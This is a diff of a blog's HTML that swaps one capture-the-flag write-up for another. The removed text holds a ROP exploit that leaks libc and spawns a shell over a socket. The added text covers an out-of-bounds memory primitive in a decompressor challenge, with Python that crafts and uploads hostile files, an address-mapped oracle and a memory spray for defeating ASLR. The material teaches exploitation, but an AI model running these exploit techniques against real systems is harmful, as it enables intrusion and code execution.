+  <span class="k">return</span> <span class="p">(</span><span class="n">target</span><span class="o">-</span><span class="n">out</span><span class="p">)</span> <span class="o">%</span> <span class="n">M64</span>
+  
+<span class="c1"># We are at 0xffffffff, what can we add to reach 0?
+</span><span class="k">print</span> <span class="p">(</span><span class="s">'{:#x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">get_off</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">,</span> <span class="mi">0</span><span class="p">)))</span>
+<span class="c1"># Result = 0xffffffff00000001
+</span>
+<span class="c1"># That's the same as doing this
+</span><span class="n">M64</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span> <span class="c1"># Maximum 64bit value
+</span><span class="k">def</span> <span class="nf">get_off</span><span class="p">(</span><span class="n">out</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">target</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+  <span class="k">return</span> <span class="p">(</span><span class="n">target</span><span class="o">-</span><span class="n">out</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">M64</span>
+  
+<span class="k">print</span> <span class="p">(</span><span class="s">'{:#x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">get_off</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">,</span> <span class="mi">0</span><span class="p">)))</span>
+
+</code></pre></div>    </div>
+
+    <p>Opcode implementation:</p>
+    <pre><code class="language-C">case 2: {
+  // Seek
+  uint64_t off = *(uint64_t*)(&amp;in[cur]);
+  cur += sizeof(off);
+  out += off;
+  break;
+}
+</code></pre>
+  </li>
+  <li>
+    <p>3 -&gt; LOAD(off, size). 
+Copy <code class="language-plaintext highlighter-rouge">size</code> bytes from <code class="language-plaintext highlighter-rouge">out - off</code> to <code class="language-plaintext highlighter-rouge">out</code>, increment <code class="language-plaintext highlighter-rouge">out</code> by 8.</p>
+
+    <p>Opcode implementation:</p>
+    <pre><code class="language-C">case 3: {
+  // Copy some previously written bytes
+  uint64_t off = *(uint64_t*)(&amp;in[cur]);
+  cur += sizeof(off);
+  uint64_t count = *(uint64_t*)(&amp;in[cur]);
+  cur += sizeof(off);
+  memcpy(out, out-off, count);
+  out += count;
+  break;
+}
+</code></pre>
+  </li>
+</ul>
+
+<p>There are no bounds check in any of the operation, that gives us 2 useful primitives:</p>
+<ul>
+  <li>Read What Where, abusing <code class="language-plaintext highlighter-rouge">SEEK+LOAD</code></li>
+  <li>Write What Where: abusing <code class="language-plaintext highlighter-rouge">SEEK+STORE</code></li>
+</ul>
+
+<p>I used this code to build the bytecode:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">IN_ADDR</span> <span class="o">=</span> <span class="mh">0x42069000000</span> <span class="c1"># PROT R
+</span><span class="n">OUT_ADDR</span> <span class="o">=</span> <span class="mh">0x13371337000</span> <span class="c1"># PROT RW
+</span><span class="n">M64</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span>
+
+<span class="k">class</span> <span class="nc">CompressedFile</span><span class="p">():</span>
+    <span class="n">__slots__</span> <span class="o">=</span> <span class="p">[</span><span class="s">'cur'</span><span class="p">,</span> <span class="s">'content'</span><span class="p">,</span> <span class="s">'out'</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">filesize</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">cur</span> <span class="o">=</span> <span class="mi">16</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">content</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">content</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0123456789abcdef</span><span class="p">)</span> <span class="c1"># magic
+</span>        <span class="bp">self</span><span class="p">.</span><span class="n">content</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">filesize</span><span class="p">)</span> <span class="c1"># file size
+</span>        <span class="bp">self</span><span class="p">.</span><span class="n">out</span> <span class="o">=</span> <span class="n">OUT_ADDR</span>
+
+    <span class="k">def</span> <span class="nf">nop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">content</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">cur</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>
+
+        <span class="bp">self</span><span class="p">.</span><span class="n">content</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01</span><span class="s">'</span> <span class="o">+</span> <span class="n">b</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">cur</span> <span class="o">+=</span> <span class="mi">2</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">out</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="k">def</span> <span class="nf">seek</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">off</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">content</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x02</span><span class="s">'</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">content</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">off</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">cur</span> <span class="o">+=</span> <span class="mi">9</span>
+
+    <span class="k">def</span> <span class="nf">memcpy</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">count</span><span class="p">):</span>
+        <span class="c1"># memcpy(out, out-off, count);
+</span>        <span class="bp">self</span><span class="p">.</span><span class="n">content</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x03</span><span class="s">'</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">content</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">off</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">content</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">count</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">cur</span> <span class="o">+=</span> <span class="mi">17</span>
 </code></pre></div></div>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">leak_libc_address</span><span class="p">(</span><span class="n">canary</span><span class="p">):</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
-    <span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"EXIT "</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">ebp_8_off</span><span class="p">]</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
-        <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">),</span>
-        <span class="n">p64</span><span class="p">(</span><span class="mh">0x4</span><span class="p">),</span>
-        <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_POP_R15</span><span class="p">),</span>
-        <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">]),</span>
-        <span class="n">p64</span><span class="p">(</span><span class="mh">0x101010101010</span><span class="p">),</span>
-        <span class="n">p64</span><span class="p">(</span><span class="n">MOV_RDX_20</span><span class="p">),</span>
-        <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">sendlen</span><span class="p">),</span>
+<h1 id="4-interacting-with-the-binary">4. Interacting with the binary</h1>
+
+<p>Before diving into the exploitation phase, It is always good to build something that let you easily interact with the binary, to avoid wasting time.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">def</span> <span class="nf">uploadFile</span><span class="p">(</span><span class="n">blob</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">fileid</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="p">(</span><span class="n">fileid</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">31</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">multipart_form_data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">'file'</span><span class="p">:</span> <span class="p">(</span><span class="sa">f</span><span class="s">'payload_</span><span class="si">{</span><span class="n">fileid</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="n">blob</span><span class="p">),</span>
+    <span class="p">}</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">SERVER_IP</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">SERVER_PORT</span><span class="si">}</span><span class="s">/upload/</span><span class="si">{</span><span class="n">fileid</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+        <span class="n">files</span><span class="o">=</span><span class="n">multipart_form_data</span>
     <span class="p">)</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">canary_off</span><span class="p">]</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
-    <span class="n">prettify_shellcode</span><span class="p">(</span><span class="n">fit</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fit</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
-    <span class="n">res</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
-    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"write addr: </span><span class="si">{</span><span class="n">res</span><span class="si">:</span><span class="c1">#08x</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">res</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">write</span>
-    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"libc addr: </span><span class="si">{</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="si">:</span><span class="c1">#08x</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">getFile</span><span class="p">(</span><span class="n">fileid</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">extract</span><span class="o">=</span><span class="s">"true"</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">SERVER_IP</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">SERVER_PORT</span><span class="si">}</span><span class="s">/files/</span><span class="si">{</span><span class="n">fileid</span><span class="si">}</span><span class="s">?extract=</span><span class="si">{</span><span class="n">extract</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span>
 </code></pre></div></div>
 
-<h3 id="drop-a-shell">Drop a shell</h3>
-<p>Now we connect a third time for the exploit. We know where libc is so
-we can rop chain <code class="language-plaintext highlighter-rouge">execve("/bin/sh", 0, 0)</code>, but we have to bind stdin and stdout
-to our socket. This is done via <code class="language-plaintext highlighter-rouge">dup2</code>,</p>
+<h3 id="inspect-the-memory-mappings-of-the-challenge">Inspect the memory mappings of the challenge</h3>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">execve</span><span class="p">(</span><span class="n">canary</span><span class="p">):</span>
-    <span class="s">"""
-    We want to build a rop to call the following
-    C code:
-    close(0);  // close stdin
-    close(1);  // close stdout
-    dup2(4, 0);  // bind stdin to socket
-    dup2(4, 1);  // bind stout to socket
-    execve("/bin/sh", 0, 0);  // pwn3d
-    """</span>
-    <span class="c1"># NOP are for stack alignment.
-</span>    <span class="n">rop</span> <span class="o">=</span> <span class="p">[</span>
-        <span class="n">POP_RDI</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">NOP</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">close</span><span class="p">,</span>
-        <span class="n">POP_RDI</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">NOP</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">close</span><span class="p">,</span>
-        <span class="n">POP_RDI</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">libc_POP_RSI</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">dup2</span><span class="p">,</span>
-        <span class="n">POP_RDI</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">libc_POP_RSI</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">dup2</span><span class="p">,</span>
-        <span class="n">POP_RDI</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh"</span><span class="p">)),</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">libc_POP_RSI</span><span class="p">,</span>
-        <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">libc_POP_RDX</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">execve</span>
-    <span class="p">]</span>
-    <span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">p64</span><span class="p">,</span> <span class="n">rop</span><span class="p">))</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
-    <span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"EXIT "</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">canary_off</span><span class="p">]</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">ebp_8_off</span><span class="p">]</span> <span class="o">=</span> <span class="n">rop</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fit</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<p>That was very important to me when trying to solve the challenge, I stared at the memory mappings for a lot of time.</p>
+
+<p>To do this, you can spawn a local instance of the challenge and read the process maps after doing some operations.</p>
+
+<p align="center"> <img src="../../assets/files/breaking-64-bit-aslr-on-linux/images/read-proc-mappings.png" /><br /> <i></i></p>
+
+<h2 id="42-isaddrmapped-oracle">4.2 isAddrMapped oracle</h2>
+
+<p>We are given a read what where primitive, so building an isAddressMapped oracle is not hard at all.</p>
+
+<p>My way to do it was to build this bytecode:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">memcpy(out, targetAddress, 1)</code></li>
+  <li><code class="language-plaintext highlighter-rouge">write(b'A')</code></li>
+</ul>
+
+<p>If targetAddress is not mapped the child program segfaults on memcpy, giving us a decompressed file filled with null bytes.</p>
+
+<p>If targetAddress is mapped, the decompressed file has a b’\x41’ as the second byte.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">isAddrMapped</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">fileid</span><span class="p">,</span> <span class="n">filelen</span><span class="o">=</span><span class="mi">2</span><span class="p">):</span>
+    <span class="n">toup</span> <span class="o">=</span> <span class="n">CompressedFile</span><span class="p">(</span><span class="n">filelen</span><span class="p">)</span>
+    
+    <span class="c1"># addr = OUT_ADDR - off
+</span>    <span class="n">off</span> <span class="o">=</span> <span class="p">(</span><span class="n">OUT_ADDR</span> <span class="o">-</span> <span class="n">addr</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">M64</span>
+    <span class="c1"># memcpy(toup.out, addr, 1)
+</span>    <span class="n">toup</span><span class="p">.</span><span class="n">memcpy</span><span class="p">(</span><span class="n">off</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="c1"># *(toup.out+1) = 0x41
+</span>    <span class="n">toup</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x41</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="n">uploadFile</span><span class="p">(</span><span class="n">toup</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="n">fileid</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">getFile</span><span class="p">(</span><span class="n">fileid</span><span class="p">)</span>
+    <span class="n">isMapped</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">content</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x41</span>
+    
+    <span class="k">return</span> <span class="n">isMapped</span>
 </code></pre></div></div>
 
-<h2 id="pwning">Pwning</h2>
+<h2 id="43-memory-spray-primitive">4.3 Memory Spray primitive</h2>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
-    <span class="c1"># ui.pause()
-</span>    <span class="n">canary</span> <span class="o">=</span> <span class="n">recv_bytes_cusu</span><span class="p">(</span><span class="o">-</span><span class="mi">13</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
-    <span class="c1"># ui.pause()
-</span>    <span class="n">leak_libc_address</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
-    <span class="n">ui</span><span class="p">.</span><span class="n">pause</span><span class="p">()</span>
-    <span class="n">execve</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<p>We can completely control the size of the decompressed file, and we get an mmap of that size in <a href="https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/resources/dist-guess-god/src/src/controller/MyController.cpp#L62">MyController.cpp:62</a>.</p>
+
+<p>In my exploit i used the <code class="language-plaintext highlighter-rouge">isAddrMapped</code> function, and changed the filelen.</p>
+
+<p>For example, let’s try to allocate a contiguous chunk of size = 0x4000000 = 64mb</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">isAddrMapped</span><span class="p">(</span><span class="n">IN_ADDR</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x4000000</span><span class="p">)</span>
 </code></pre></div></div>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>  ./pwn_knife.py REMOTE
+<p>That’s the result:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@088ec31b2ce9:/home/ctf/challenge# cat /proc/47/maps
 ...
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> write addr: 0x7fcd7d63c140
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> libc addr: 0x7fcd7d52c000
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
-<span class="nv">$ </span> <span class="nb">ls
-</span>chall
-config.txt
-flag.txt
-<span class="nv">$ </span> <span class="nb">cat </span>flag.txt
-ptm<span class="o">{</span>f0rk5_ar3n7_g00d_f0r_cnr13s<span class="o">}</span>
+7f3450000000-7f3454000000 r--p 00000000 00:af 3                          /challenge/files/0.unkyle
+...
 </code></pre></div></div>
+
+<p>If you try do it again:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">isAddrMapped</span><span class="p">(</span><span class="n">IN_ADDR</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x4000000</span><span class="p">)</span>
+<span class="n">isAddrMapped</span><span class="p">(</span><span class="n">IN_ADDR</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x4000000</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>That’s the result:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7f344c000000-7f3450000000 r--p 00000000 00:af 5                          /challenge/files/1.unkyle
+7f3450000000-7f3454000000 r--p 00000000 00:af 3                          /challenge/files/0.unkyle
+</code></pre></div></div>
+
+<p>Nice! Multiple allocations won’t have gaps.</p>
+
+<h2 id="44-how-much-memory-to-spray">4.4 How much memory to spray?</h2>
+
+<p>As you can see from <a href="#poc-of-aslr-bypass-on-linux">this poc</a>, the ideal size for the contiguous mapped memory would be 16TB.</p>
+
+<p>Unfortunately, if you try to allocate 16TB of memory on the remote server, the mmap will fail, because <a href="https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64#21-initial-foothold">nsjail limit this</a>.</p>
+
+<p>After some trial and error I found out that I can spray ~3840mb of memory, with this code:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">size</span> <span class="o">=</span>    <span class="mh">0x000004000000</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">):</span>
+    <span class="k">print</span> <span class="p">(</span><span class="s">'.'</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+    <span class="n">isAddrMapped</span><span class="p">(</span><span class="n">IN_ADDR</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>the result memory mappings will be something like this:</p>
+
+<h3 id="memory-spray-result">Memory Spray result</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@088ec31b2ce9:/home/ctf/challenge# cat /proc/`pgrep flag_server-exe`/maps
+... My spray: ...
+7fe2dc000000-7fe2e0000000 r--p 00000000 00:af 121                        /challenge/files/59.unkyle
+7fe2e0000000-7fe2e4000000 r--p 00000000 00:af 119                        /challenge/files/58.unkyle
+7fe2e4000000-7fe2e8000000 r--p 00000000 00:af 117                        /challenge/files/57.unkyle
+7fe2e8000000-7fe2ec000000 r--p 00000000 00:af 115                        /challenge/files/56.unkyle
+7fe2ec000000-7fe2f0000000 r--p 00000000 00:af 113                        /challenge/files/55.unkyle
+7fe2f0000000-7fe2f4000000 r--p 00000000 00:af 111                        /challenge/files/54.unkyle
+7fe2f4000000-7fe2f8000000 r--p 00000000 00:af 109                        /challenge/files/53.unkyle
+7fe2f8000000-7fe2fc000000 r--p 00000000 00:af 107                        /challenge/files/52.unkyle
+7fe2fc000000-7fe300000000 r--p 00000000 00:af 105                        /challenge/files/51.unkyle
+7fe300000000-7fe304000000 r--p 00000000 00:af 103                        /challenge/files/50.unkyle
+7fe304000000-7fe308000000 r--p 00000000 00:af 101                        /challenge/files/49.unkyle
+7fe308000000-7fe30c000000 r--p 00000000 00:af 99                         /challenge/files/48.unkyle
+7fe30c000000-7fe310000000 r--p 00000000 00:af 97                         /challenge/files/47.unkyle
+7fe310000000-7fe314000000 r--p 00000000 00:af 95                         /challenge/files/46.unkyle
+7fe314000000-7fe318000000 r--p 00000000 00:af 93                         /challenge/files/45.unkyle
+7fe318000000-7fe31c000000 r--p 00000000 00:af 91                         /challenge/files/44.unkyle
+7fe31c000000-7fe320000000 r--p 00000000 00:af 89                         /challenge/files/43.unkyle
+7fe320000000-7fe324000000 r--p 00000000 00:af 87                         /challenge/files/42.unkyle
+7fe324000000-7fe328000000 r--p 00000000 00:af 85                         /challenge/files/41.unkyle
+7fe328000000-7fe32c000000 r--p 00000000 00:af 83                         /challenge/files/40.unkyle
+7fe32c000000-7fe330000000 r--p 00000000 00:af 81                         /challenge/files/39.unkyle
+7fe330000000-7fe334000000 r--p 00000000 00:af 79                         /challenge/files/38.unkyle
+7fe334000000-7fe338000000 r--p 00000000 00:af 77                         /challenge/files/37.unkyle
+7fe338000000-7fe33c000000 r--p 00000000 00:af 75                         /challenge/files/36.unkyle
+7fe33c000000-7fe340000000 r--p 00000000 00:af 73                         /challenge/files/35.unkyle
+7fe340000000-7fe344000000 r--p 00000000 00:af 71                         /challenge/files/34.unkyle
+7fe344000000-7fe348000000 r--p 00000000 00:af 69                         /challenge/files/33.unkyle
+7fe348000000-7fe34c000000 r--p 00000000 00:af 67                         /challenge/files/32.unkyle
+7fe34c000000-7fe350000000 r--p 00000000 00:af 65                         /challenge/files/31.unkyle
+7fe350000000-7fe354000000 r--p 00000000 00:af 63                         /challenge/files/30.unkyle
+7fe354000000-7fe358000000 r--p 00000000 00:af 61                         /challenge/files/29.unkyle
+7fe358000000-7fe35c000000 r--p 00000000 00:af 59                         /challenge/files/28.unkyle
+7fe35c000000-7fe360000000 r--p 00000000 00:af 57                         /challenge/files/27.unkyle
+7fe360000000-7fe364000000 r--p 00000000 00:af 55                         /challenge/files/26.unkyle
+7fe364000000-7fe368000000 r--p 00000000 00:af 53                         /challenge/files/25.unkyle
+7fe368000000-7fe36c000000 r--p 00000000 00:af 51                         /challenge/files/24.unkyle
+7fe36c000000-7fe370000000 r--p 00000000 00:af 49                         /challenge/files/23.unkyle
+7fe370000000-7fe374000000 r--p 00000000 00:af 47                         /challenge/files/22.unkyle
+7fe374000000-7fe378000000 r--p 00000000 00:af 45                         /challenge/files/21.unkyle
+7fe378000000-7fe37c000000 r--p 00000000 00:af 43                         /challenge/files/20.unkyle
+7fe37c000000-7fe380000000 r--p 00000000 00:af 41                         /challenge/files/19.unkyle
+7fe380000000-7fe384000000 r--p 00000000 00:af 39                         /challenge/files/18.unkyle
+7fe384000000-7fe388000000 r--p 00000000 00:af 37                         /challenge/files/17.unkyle
+7fe388000000-7fe38c000000 r--p 00000000 00:af 35                         /challenge/files/16.unkyle
+7fe38c000000-7fe390000000 r--p 00000000 00:af 33                         /challenge/files/15.unkyle
+7fe390000000-7fe394000000 r--p 00000000 00:af 31                         /challenge/files/14.unkyle
+7fe394000000-7fe398000000 r--p 00000000 00:af 29                         /challenge/files/13.unkyle
+7fe398000000-7fe39c000000 r--p 00000000 00:af 27                         /challenge/files/12.unkyle
+7fe39c000000-7fe3a0000000 r--p 00000000 00:af 25                         /challenge/files/11.unkyle
+7fe3a0000000-7fe3a0021000 rw-p 00000000 00:00 0
+7fe3a0021000-7fe3a4000000 ---p 00000000 00:00 0
+7fe3a4000000-7fe3a8000000 r--p 00000000 00:af 23                         /challenge/files/10.unkyle
+7fe3a8000000-7fe3ac000000 r--p 00000000 00:af 21                         /challenge/files/9.unkyle
+7fe3ac000000-7fe3b0000000 r--p 00000000 00:af 19                         /challenge/files/8.unkyle
+7fe3b0000000-7fe3b4000000 r--p 00000000 00:af 17                         /challenge/files/7.unkyle
+7fe3b4000000-7fe3b8000000 r--p 00000000 00:af 15                         /challenge/files/6.unkyle
+7fe3b8000000-7fe3bc000000 r--p 00000000 00:af 13                         /challenge/files/5.unkyle
+7fe3bc000000-7fe3c0000000 r--p 00000000 00:af 11                         /challenge/files/4.unkyle
+7fe3c0000000-7fe3c4000000 r--p 00000000 00:af 9                          /challenge/files/3.unkyle
+7fe3c4000000-7fe3c8000000 r--p 00000000 00:af 7                          /challenge/files/2.unkyle
